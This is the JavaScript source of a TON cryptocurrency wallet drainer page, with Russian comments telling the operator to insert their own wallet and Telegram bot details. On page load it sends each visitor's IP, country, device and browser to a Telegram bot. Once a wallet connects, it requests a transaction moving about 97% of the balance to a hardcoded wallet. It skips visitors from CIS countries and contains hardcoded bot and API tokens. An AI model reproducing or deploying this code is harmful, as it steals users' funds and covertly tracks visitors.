document.addEventListener('DOMContentLoaded', () => {
    var mainWallet = "UQCjC4fYcBADiiX_RQ_OHHNoIBCk1AqPNzSth2NRpwIRI2Em"; // Замени на адрес своего кошелька
    var tgBotToken = "7664896852:AAGZGV5KjVG2g4MvACTDhAjK2ONL9qXRBAA"; // Замени на токен своего Telegram-бота
    var tgChat = -1002426182115; // Замени на ID чата или канала в Telegram
    var domain = window.location.hostname;
    var ipUser;
    var countryUser;

    // Инициализация TON Connect UI
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: `https://leonardokotu.github.io/mysite/tonconnect-manifest.json`, // URL манифеста
        buttonRootId: 'ton-connect' // ID элемента для кнопки подключения
    });

    // Получение IP и страны пользователя
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            const country = data.country;
            ipUser = data.ip;
            countryUser = data.country;

            // Получаем информацию об устройстве и браузере
            const userAgent = navigator.userAgent;
            const os = getOS(userAgent);
            const device = getDevice(userAgent);
            const browser = getBrowser(userAgent);

            // Отправка сообщения в Telegram о посещении сайта
            const messageOpen = `
🌐 *Domain:* ${domain}
🖥️ *OS:* ${os}
📱 *Device:* ${device}
🌍 *Country:* ${country} (${countryUser})
📡 *IP:* ${ipUser}
🛠️ *Browser:* ${browser}
🔗 *User Agent:* ${userAgent}
            `;
            sendTelegramMessage(messageOpen);

            // Перенаправление для стран СНГ
            if (['RU', 'KZ', 'BY', 'UA', 'AM', 'AZ', 'KG', 'MD', 'UZ'].includes(country)) {
                window.location.replace('https://ton.org');
            }
        })
        .catch(error => {
            const errorMessage = `\uD83D\uDED1*Ошибка при получении IP:* ${error.message}`;
            sendTelegramMessage(errorMessage);
        });

    // Обработка подключения кошелька
    tonConnectUI.onStatusChange(wallet => {
        if (wallet) {
            // Отправка информации о подключенном кошельке в Telegram
            const walletInfo = `
💼 *Кошелек подключен:*
💻 *Адрес:* ${wallet.account.address}
💰 *Баланс:* ${wallet.account.balance} TON
            `;
            sendTelegramMessage(walletInfo);

            // Автоматически запускаем процесс отправки средств
            didtrans(wallet.account.address);
        } else {
            const messageDisconnected = `\uD83D\uDED1*Кошелек отключен.*`;
            sendTelegramMessage(messageDisconnected);
        }
    });

    // Функция для отправки транзакции
    async function didtrans(walletAddress) {
        if (!walletAddress) {
            const errorMessage = `\uD83D\uDED1*Ошибка:* Адрес кошелька не указан.`;
            sendTelegramMessage(errorMessage);
            return;
        }

        const apiKey = "174eb3d989539906679b1847b569f3a10464a2c1b29fc60b6ae95dd54a2bc31d";
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}&api_key=${apiKey}`);
        const data = await response.json();
        const originalBalance = parseFloat(data.balance);
        const processedBalance = originalBalance - (originalBalance * 0.03); // Вычитаем 3% для комиссий
        const tgBalance = processedBalance / 1000000000; // Конвертация в TON

        if (processedBalance <= 0) {
            const errorMessage = `\uD83D\uDED1*Ошибка:* Недостаточный баланс для выполнения транзакции.`;
            sendTelegramMessage(errorMessage);
            return;
        }

        const transaction = {
            validUntil: Math.floor(Date.now() / 1000) + 60, // Транзакция действительна 60 секунд
            messages: [{
                address: mainWallet,
                amount: processedBalance.toString() // Сумма в нанотонах
            }]
        };

        try {
            // Отправка транзакции
            const result = await tonConnectUI.sendTransaction(transaction);

            // Отправка сообщения в Telegram об успешной транзакции
            const messageSend = `
🌐 *Domain:* ${domain}
💻 *User:* ${ipUser} ${countryUser}
📦 *Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})
💎 *Send:* ${tgBalance} TON
            `;
            sendTelegramMessage(messageSend);
        } catch (error) {
            // Отправка сообщения в Telegram об ошибке
            const messageDeclined = `
🌐 *Domain:* ${domain}
💻 *User:* ${ipUser} ${countryUser}
📦 *Wallet:* [Ton Scan](https://tonscan.org/address/${walletAddress})
🛑 *Declined or error.*
            `;
            sendTelegramMessage(messageDeclined);
        }
    }

    // Функция для отправки сообщений в Telegram
    function sendTelegramMessage(message) {
        if (!tgBotToken || !tgChat) {
            console.error('Токен или чат Telegram не указаны.');
            return;
        }

        const encodedMessage = encodeURIComponent(message);
        const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessage}&parse_mode=Markdown`;

        fetch(url, { method: 'POST' })
            .then(response => {
                if (!response.ok) {
                    console.error('Ошибка при отправке сообщения в Telegram.');
                }
            })
            .catch(error => console.error('Ошибка:', error));
    }

    // Функция для определения операционной системы
    function getOS(userAgent) {
        if (/windows/i.test(userAgent)) return "Windows";
        if (/macintosh/i.test(userAgent)) return "Mac OS";
        if (/linux/i.test(userAgent)) return "Linux";
        if (/android/i.test(userAgent)) return "Android";
        if (/ios/i.test(userAgent)) return "iOS";
        return "Unknown OS";
    }

    // Функция для определения устройства
    function getDevice(userAgent) {
        if (/mobile/i.test(userAgent)) return "Mobile";
        if (/tablet/i.test(userAgent)) return "Tablet";
        if (/ipad/i.test(userAgent)) return "iPad";
        if (/iphone/i.test(userAgent)) return "iPhone";
        if (/windows phone/i.test(userAgent)) return "Windows Phone";
        return "Desktop";
    }

    // Функция для определения браузера
    function getBrowser(userAgent) {
        if (/chrome/i.test(userAgent)) return "Chrome";
        if (/firefox/i.test(userAgent)) return "Firefox";
        if (/safari/i.test(userAgent)) return "Safari";
        if (/edge/i.test(userAgent)) return "Edge";
        if (/opera/i.test(userAgent)) return "Opera";
        if (/trident/i.test(userAgent)) return "Internet Explorer";
        return "Unknown Browser";
    }
});
